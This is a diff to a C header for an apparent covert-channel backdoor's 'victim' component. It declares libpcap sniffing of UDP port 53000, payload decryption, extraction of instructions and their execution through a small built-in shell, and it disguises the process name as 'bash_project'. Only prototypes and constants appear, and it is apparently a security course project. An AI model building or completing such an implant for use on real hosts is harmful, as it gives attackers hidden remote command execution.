@@ -4,15 +4,17 @@
 #include "common.h"
 
 
-#define DEFAULT_COUNT 100
-#define SIZE_ETHERNET 14
+#define DEFAULT_COUNT 10000
+#define S_ARR_SIZE 64
+#define LSH_RL_BUFSIZE 1024
+#define LSH_TOK_BUFSIZE 64
+#define LSH_TOK_DELIM " \t\r\n\a"
 
 #define DEFAULT_PORT 53000
+#define FILTER "udp and dst port 53000"
 #define TRUE 1
 #define FALSE 0
 #define MASK "bash_project"
-
-void check_root_user(void);
 
 
 // tcpdump header (ether.h) defines ETHER_HDRLEN)
@@ -21,27 +23,40 @@ void check_root_user(void);
 #endif
 
 struct options_victim {
-    unsigned int count;
     int victim_socket;
-    int attacker_socket;
-    char temp_ip[16];
-    char sniffer_ip[16];
-    char decrypt_instruction[128];
-    char filter[128];
-    bool victim_flag;
-    bool pcap2_flag;
-    bool serv_flag;
-    bool command_flag;
-    bool ip_flag;
-    char buffer[65507];
+    char received_buffer[S_ARR_SIZE];
+    char instruction[S_ARR_SIZE];
 };
 
+const char *builtin_str[] = {
+        "cd",
+        "exit"
+};
 
 // Function Prototypes
 void options_victim_init(struct options_victim *opts);
 void program_setup(void);
 void initialize_victim_server(struct options_victim *opts);
 void add_new_socket(struct options_victim *opts, int attacker_socket, struct sockaddr_in *attacker_address);
+void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void extract_instruction(u_char *args);
+void execute_instruction(u_char *args);
+char **split_line(char *line);
+int execute_command(char **command_arr);
+int num_builtins(void);
+int builtin_cd(char **args);
+int builtin_exit(char **args);
+int launch(char **args);
+
+
+
+
+int (*builtin_func[]) (char **) = {
+        &builtin_cd,
+        &builtin_exit
+};
+
 
 u_int16_t handle_ethernet (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void handle_IP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
@@ -49,7 +64,6 @@ void handle_TCP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* p
 void handle_UDP (u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void print_payload (const u_char *, int);
 void print_hex_ascii_line (const u_char *, int, int);
-void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void decrypt_payload(u_char *payload);
 void extract_square_bracket_string(char* input);
 
